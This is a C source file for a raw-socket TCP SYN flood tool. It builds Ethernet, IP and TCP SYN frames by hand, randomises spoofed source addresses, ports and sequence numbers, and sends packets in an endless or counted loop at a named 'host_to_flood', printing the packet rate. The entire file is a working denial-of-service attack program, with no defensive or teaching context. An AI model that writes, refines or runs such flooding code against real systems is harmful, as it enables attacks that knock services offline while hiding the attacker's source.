#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <sys/time.h>
#include <net/if.h>

typedef unsigned char   __u8;
typedef short           __be16;
typedef unsigned short  __u16;
typedef unsigned int   __be32;
typedef unsigned int   __u32;

#define DEFAULT_PORT 80
#define ETH_ALEN 6
/* from /usr/include/linux/sockios.h */
#define SIOCGIFINDEX       0x8933
#define SIOCGIFHWADDR	   0x8927          /* Get hardware address         */

int verbose = 1;
int errors = 0;

struct iphdr {
    __u8    ihl:4,
            version:4;
    __u8    tos;
    __be16  tot_len;
    __be16  id;
    __be16  frag_off;
    __u8    ttl;
    __u8    protocol;
    __u16   check;
    __be32  saddr;
    __be32  daddr;
};

struct tcphdr {
    __u16   source;
    __u16   dest;
    __u32   seq;
    __u32   ack_seq;
    __u16   res1:4,
            doff:4,
            fin:1,
            syn:1,
            rst:1,
            psh:1,
            ack:1,
            urg:1,
            ece:1,
            cwr:1;
    __u16   window;
    __u16   check;
    __u16   urg_ptr;
};

struct ether_header
{
  __u8  ether_dhost[ETH_ALEN];      /* destination eth addr */
  __u8  ether_shost[ETH_ALEN];      /* source ether addr    */
  __u16 ether_type;                 /* packet type ID field */
} __attribute__ ((__packed__));

struct sockaddr_ll {
        __u16   sll_family;
        __be16  sll_protocol;
        __u32   sll_ifindex;
        __u16   sll_hatype;
        __u8    sll_pkttype;
        __u8    sll_halen;
        __u8    sll_addr[8];
};

void fail(char *s) {
    perror(s);
    exit(-1);
}

void usage(char * selfname) {
    printf("Usage: %s [-q] [-s source] [-p port] [-n npackets] -A TR:GT:MA:CA:DR:ES -i interface host_to_flood\n", selfname);
    exit(-1);
}

unsigned short csum(unsigned char * what, int len) {
	__u16 * b;
	__u32 sum;

	b = (unsigned short *)what;
	len /= 2; /* we work only with even */

	for (sum=0; len; len--) {
            sum += b[len-1];
        }

	sum = (sum >> 16) + (sum & 0xffff);

	return (unsigned short) ~sum;
}

unsigned short csumx (unsigned char * what, int len) {
        unsigned int sum=0, tmp;
        int i=0;

        while (len>1) {
                sum+=((unsigned short *)what)[i++];
                len-=2;
        }
        if (len) sum+=what[2*i+1];

        tmp=(sum&0xffff) + (sum>>16);
	sum=(tmp&0xffff) + (tmp>>16);
	return (unsigned short)((~sum)&0xffff);
}

int parse_eth_addr(char * in, __u8* out) {
    int i, head = 0;
    char * error;

    if (strlen(in) != 17) goto parse_eth_error;

    for (i=0; i<6; i++) {
        if ((in[head+2] != ':') && (i!=5)) goto parse_eth_error;
        in[head+2] = 0;
        out[i] = (__u8)strtol(in+head, &error, 16);
        if (*error) goto parse_eth_error;
	head+=3;
    }

    return 0;

parse_eth_error:
    printf("Unable to parse hwaddr format. Should use: AA:BB:CC:DD:EE:FF. Don't care about lower or upper case though.\n");
    return 1;
}

void read_random(char * where, int count) {
    static int rfd=-1;
    
    if (rfd == -1) rfd = open("/dev/urandom", O_RDONLY);
    
    read(rfd, where, count);
}

unsigned int host_to_ip(char *s) {
    struct in_addr ip;
    struct hostent * host;
    

    if (!inet_aton(s, &ip)) {
        host = gethostbyname(s);
        if (!host) 
            return 0;
        else 
            return *((unsigned int *)(host->h_addr));

    } else {
        return ip.s_addr;
    }
}

void do_flood(int s, char *buf, unsigned int npackets, char *source, int ifindex, __u8 *destmac) {
    struct iphdr * iph;
    struct tcphdr * tcph;
    struct ether_header * ethh;
    struct sockaddr_in sin;
    struct sockaddr_ll sll;
    unsigned short tot_len;

    __u32 counter=0;
    struct timeval start, now;

    struct pseudo_buffer {
    	__u32 saddr;
	__u32 daddr;
	__u8 reserved;
	__u8 proto;
	__u16 payload_length;
    } *pb;

    char tcp_check_buf[256];
    
    ethh = (struct ether_header *)buf;
    iph = (struct iphdr *)(buf+sizeof(struct ether_header));
    tcph = (struct tcphdr *)(buf+sizeof(struct iphdr)+sizeof(struct ether_header));

    tot_len = htons(iph->tot_len);


    /* use sockaddr_ll instead of sockaddr_in */
    sll.sll_ifindex = ifindex;
    sll.sll_halen = ETH_ALEN;
    memcpy(sll.sll_addr, destmac, ETH_ALEN);
/*
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iph->daddr;
    sin.sin_port = tcph->dest; */

    gettimeofday(&start, NULL);
    
    do {
        /* set variable fields */
#define SET_RANDOM(x, y) read_random((char *)(&(x)), y)
                
        SET_RANDOM(iph->id, 2);
        SET_RANDOM(iph->saddr, 4);
        SET_RANDOM(tcph->source, 2);
        SET_RANDOM(tcph->seq, 4);
        
        if (source){
            iph->saddr = inet_addr(source);
        }

        /* checksums */
        /* ip */
        iph->check = 0;
        iph->check = csum((unsigned char *)iph, sizeof(*iph));
        /* tcp */
        tcph->check = 0;
        memset(tcp_check_buf, 0, sizeof(tcp_check_buf));
        
        pb = (struct pseudo_buffer *)tcp_check_buf;
        pb->saddr = iph->saddr;
        pb->daddr = iph->daddr;
        pb->reserved = 0;
        pb->proto = 6;
        pb->payload_length = htons(sizeof(*tcph));

        memcpy(tcp_check_buf + sizeof(*pb), tcph, sizeof(*tcph));

    //	printf ("%04x %d\n", csum(tcp_check_buf, sizeof(*tcph) + sizeof(*pb)), sizeof(*tcph) + sizeof(*pb));

        tcph->check = csum((unsigned char *)tcp_check_buf, sizeof(*tcph) + sizeof(*pb));
   /*         
        if (sendto(s, buf, tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
	    errors++;
            //fail("sendto");
        }
    */
        if (sendto(s, buf, tot_len + sizeof(*ethh), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
            fail("sendto");
            errors++;
        }


        counter++;
        if (!(counter & 0xffff)) {
	    int usecs;

            gettimeofday(&now, NULL);
            if (now.tv_usec < start.tv_usec) {
            	now.tv_usec += 1000000;
                now.tv_sec -= 1;
            }
            usecs = (now.tv_sec - start.tv_sec) * 1000000 + (now.tv_usec - start.tv_usec);
            usecs = usecs/1000; // millisecs
            printf ("send %d packets, rate %f pps, errors: %d\n", counter, ((float)counter)/usecs*1000, errors);
        }
        
        if (npackets > 0)
            if (! --npackets)
                break;

    } while(1);
    
    exit(0);
}
    

void flood(unsigned int ip, unsigned short port, unsigned int npackets, char * source, char * interface, __u8 * destmac) {
    int s, i;
    char buf[1514];
    struct ether_header * ethh;
    struct iphdr * iph;
    struct tcphdr * tcph;
    struct ifreq if_idx;
    int one = 1;
    int interface_index;
    
    s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (s==-1) fail("socket");
   
    /* not ip packet */
/*    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
          fail("setsockopt1");
*/

    /* think this one also useless */
    if(setsockopt(s, SOL_SOCKET, SO_DONTROUTE, &one, sizeof(one)) < 0)
        fail("setsockopt2");
/*
    if(setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface)) < 0)
        fail("setsockopt3"); 
*/
   
    ethh = (struct ether_header *)buf;
    iph = (struct iphdr *)(buf+sizeof(struct ether_header));
    tcph = (struct tcphdr *)(buf+sizeof(struct iphdr)+sizeof(struct ether_header));

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(s, SIOCGIFINDEX, &if_idx) < 0) fail("SIOCGIFINDEX");
    interface_index = if_idx.ifr_ifindex;
    printf ("sending packets to %s (index: %d)\n", interface, interface_index);

    /* acquire self mac address. not to confuse switch */
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(s, SIOCGIFHWADDR, &if_idx) < 0) fail("SIOCGIFHWADDR");
    
    /* setup constant fields */
    memset(ethh, 0, sizeof(*ethh));
    memcpy(ethh->ether_dhost, destmac, ETH_ALEN);
    memcpy(ethh->ether_shost, if_idx.ifr_hwaddr.sa_data, ETH_ALEN);
    ethh->ether_type = htons(0x0800);


    printf ("src mac: "); for(i=0; i<6; i++) { printf ("%02x", (unsigned char)(ethh->ether_shost[i])); if(i!=5) printf(":"); } printf("\n");
    printf ("dst mac: "); for(i=0; i<6; i++) { printf ("%02x", (unsigned char)(ethh->ether_dhost[i])); if(i!=5) printf(":"); } printf("\n");

    memset(iph, 0, sizeof(*iph));
    iph->version = 4;
    iph->ihl = 5;
    
    iph->tos = 16;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;
    iph->daddr = ip;
    
    memset(tcph, 0, sizeof(*tcph));
    tcph->dest = port;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->doff = 5;

    printf ("packet length: %d\n", ntohs(iph->tot_len));
    
    do_flood(s, buf, npackets, source, interface_index, destmac);
}
    

int main (int argc, char ** argv) {
    int i;
    unsigned int ip;
    unsigned short port=htons(DEFAULT_PORT);
    unsigned int npackets=-1;
    char * source = NULL;
    char * interface = NULL;
    __u8 destmac[ETH_ALEN];
    
    while ((i=getopt(argc, argv, "qp:n:s:i:A:")) != -1) {
        switch(i) {
            case 'q':
                verbose = 0;
                break;
            case 'p':
                port = htons(atoi(optarg));
                break;
            case 'n':
                npackets = atoi(optarg);
                break;
            case 's':
                source = optarg;
                break;
            case 'i':
                interface = optarg;
                break;
            case 'A':
                if (parse_eth_addr(optarg, destmac)) usage(argv[0]);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }
    
    if (optind != argc-1) usage(argv[0]);
    if (interface == NULL) usage(argv[0]);
    
    printf("flooding host %s\n", argv[optind]);
    
    ip = host_to_ip(argv[optind]);
    if (!ip) {
        printf("unable to resolve %s\n", argv[optind]);
        exit(-1);
    }
    
    flood(ip, port, npackets, source, interface, destmac);
}
